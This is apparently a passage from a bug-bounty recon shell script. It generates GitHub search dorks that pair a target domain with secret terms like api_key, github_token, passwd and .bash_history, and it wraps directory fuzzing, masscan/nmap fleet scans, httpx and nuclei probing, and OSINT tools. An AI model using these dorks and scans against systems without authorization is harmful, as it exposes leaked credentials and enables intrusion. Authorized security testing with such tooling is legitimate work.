  echo " client_secret"
  echo "https://github.com/search?q=%22$1%22+client_secret&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+client_secret&type=Code"
  echo ""
  echo " sshd_config"
  echo "https://github.com/search?q=%22$1%22+sshd_config&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+sshd_config&type=Code"
  echo ""
  echo " github_token"
  echo "https://github.com/search?q=%22$1%22+github_token&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+github_token&type=Code"
  echo ""
  echo " api_key"
  echo "https://github.com/search?q=%22$1%22+api_key&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+api_key&type=Code"
  echo ""
  echo " FTP"
  echo "https://github.com/search?q=%22$1%22+FTP&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+FTP&type=Code"
  echo ""
  echo " app_secret"
  echo "https://github.com/search?q=%22$1%22+app_secret&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+app_secret&type=Code"
  echo ""
  echo "  passwd"
  echo "https://github.com/search?q=%22$1%22+passwd&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+passwd&type=Code"
  echo ""
  echo " s3.yml"
  echo "https://github.com/search?q=%22$1%22+.env&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+.env&type=Code"
  echo ""
  echo " .exs"
  echo "https://github.com/search?q=%22$1%22+.exs&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+.exs&type=Code"
  echo ""
  echo " beanstalkd.yml"
  echo "https://github.com/search?q=%22$1%22+beanstalkd.yml&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+beanstalkd.yml&type=Code"
  echo ""
  echo " deploy.rake"
  echo "https://github.com/search?q=%22$1%22+deploy.rake&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+deploy.rake&type=Code"
  echo ""
  echo " mysql"
  echo "https://github.com/search?q=%22$1%22+mysql&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+mysql&type=Code"
  echo ""
  echo " credentials"
  echo "https://github.com/search?q=%22$1%22+credentials&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+credentials&type=Code"
  echo ""
  echo " PWD"
  echo "https://github.com/search?q=%22$1%22+PWD&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+PWD&type=Code"
  echo ""
  echo " deploy.rake"
  echo "https://github.com/search?q=%22$1%22+deploy.rake&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+deploy.rake&type=Code"
  echo ""
  echo " .bash_history"
  echo "https://github.com/search?q=%22$1%22+.bash_history&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+.bash_history&type=Code"
  echo ""
  echo " .sls"
  echo "https://github.com/search?q=%22$1%22+.sls&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+PWD&type=Code"
  echo ""
  echo " secrets"
  echo "https://github.com/search?q=%22$1%22+secrets&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+secrets&type=Code"
  echo ""
  echo " composer.json"
  echo "https://github.com/search?q=%22$1%22+composer.json&type=Code"
  echo "https://github.com/search?q=%22$without_suffix%22+composer.json&type=Code"
  echo ""
}

check4vulns() {
  redUrl
  blindssrf
  #  github-dorker -> gitrob, git-dump, git-hound, git-all-secrets
  #  google-dorker -> thehavester, jnx-script
  #  shodan-dorker -> reconSai
  #  CORStest -> CORStest
  #  AWSbuckets ScoutSuite -> S3canner, lazyS3, mass3, s3Takeover
  #  domain-takeover -> subzy, subzero, tko-subs, takeover, subjack
  #  XSS -> XSStrike
  #  backupfiles -> BFAC
  #  crlf -> CRLF-Injection-Scanner
}

#getapk(){ adb }
#pushapk(){ adb }

dapk() {
  apktool d $1
}

#rapk(){ apktool   $1 }
#apk2jar(){ enjarify }
#readjar(){ jadx jd-gui jd-cmd }

#androidapp-recon() {
# get endpoints
# add ssl cert to an app automaticly
# decodify reverseAPK websf ninjadroid
#}

# OSINT tools
check4phNsq() {
  ~/tools/urlcrazy/urlcrazy -p $1
  #python3 ~/tools/dnstwist/dnstwist.py
}

fullOSINT() {
  check4phNsq
  #  spiderfoot
  #  hunter.io
  #  intelx.io
  #  Zoomeye
  #  nerdydata
  #  crunchbase
  #  curl emailrep.io/$email
  #  OSRF
  #  theharvester
  #  recon-ng-v5
}

# reference for scripts
# https://github.com/venom26/recon
# https://github.com/offhourscoding/recon
# https://github.com/Sambal0x/Recon-tools
# https://github.com/JoshuaMart/AutoRecon

DIRS_LARGE=$HOME/Lists/raft-medium-directories.txt
fufapi() {
  ffuf -u $1/FUZZ -w $HOME/Lists/apiwords.txt -mc 200 -t 100
}

fufdir() {
  ffuf -u $1/FUZZ -w $DIRS_LARGE -mc 200,301,302,403 -t 170
}

fufextension() {
  ffuf -u $1/FUZZ -mc 200,301,302,403,401 -t 150 -w $ToolsPath/ffuf_extension.txt -e .php,.asp,.aspx,.jsp,.py,.txt,.conf,.config,.bak,.backup,.swp,.old,.db,.sql,.json,.xml,.log,.zip
}

feroxdir() {
  feroxbuster -u $1 -e --status-codes 200,301,302 -w $HOME/Lists/raft-large-directories-lowercase.txt
}

fleetScan() {

  company=$(cat domains)
  liveHosts=$company-live.txt

  # Start a fleet called stock with 9 instances and expire after 2 hours
  axiom-fleet well -i= 

  # Run a scan, use the stok fleet, use the ranges file we just made, and set the ports to 443, then set the output file
  axiom-scan 'well*' --rate=10000 -p443 --banners -iL=clean.subdomains -o=masscanIC.txt

  echo 'Clean file ...'

  cat masscanIC.txt | awk '{print $2}' | grep -v Masscan | grep -v Ports | sort -u | tee $liveHosts
  axiom-scan "well*" -iL=$liveHosts -p443 -sV -sC -T4 -m=nmapx -o=output

  echo 'Remove servers ...'
  axiom-rm "well0*" -f
}
discoverLive() {
  echo 'scan network' $1
  sudo nmap -v -sn $1 -oG liveHosts
  cat liveHosts | grep Up | awk '{print $2}' | anew IpLiveHosts
  cat IpLiveHosts | httpx -silent -o largePorts -timeout 60 -threads 100 -tech-detect -status-code -title -follow-redirects -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
  cat largePorts | grep -v 404 | anew HTTPOK
  cat HTTPOK | awk '{print $1}' | anew hostwithPorts
  cat HTTPOK | aquatone -ports large -scan-timeout 900 -http-timeout 6000 -out aqua_out -threads 20
  cat hostwithPorts | nuclei -t technologies -o techs -c 60 -stats
  echo 'end discovery'
}

discoverLive4faraday() {
  echo 'scan network' $1
  sudo nmap -v -sn $1 -oG liveHosts
  cat liveHosts | grep Up | awk '{print $2}' | anew IpLiveHosts
  cat IpLiveHosts | httpx -silent -o largePorts -timeout 60 -threads 100 -tech-detect -status-code -title -follow-redirects -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
  cat largePorts | awk '{print $1}' | cut -d '/' -f 3 | cut -d ':' -f 1 | anew host4faraday
  echo 'end discovery'
}
